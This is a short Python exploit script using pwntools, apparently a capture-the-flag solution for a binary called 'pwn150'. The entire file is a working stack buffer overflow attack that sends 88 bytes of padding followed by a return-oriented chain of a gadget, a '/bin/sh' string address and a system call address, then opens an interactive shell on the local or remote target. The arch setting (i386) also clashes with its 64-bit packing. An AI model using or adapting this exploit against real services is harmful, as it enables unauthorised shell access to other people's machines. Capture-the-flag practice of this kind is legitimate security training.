#!/usr/bin/env python
#TnMch

from pwn import *

context(arch='i386',os='linux')
local = True

if local: p = process("./pwn150")
else: p = remote("127.0.0.1", 5253)

system = p64(0x40075f)
binsh = p64(0x4003ef)

payload = ""
payload += "A"*88
payload += p64(0x00400883)
payload += binsh
payload += system
p.sendline(payload)
p.interactive()
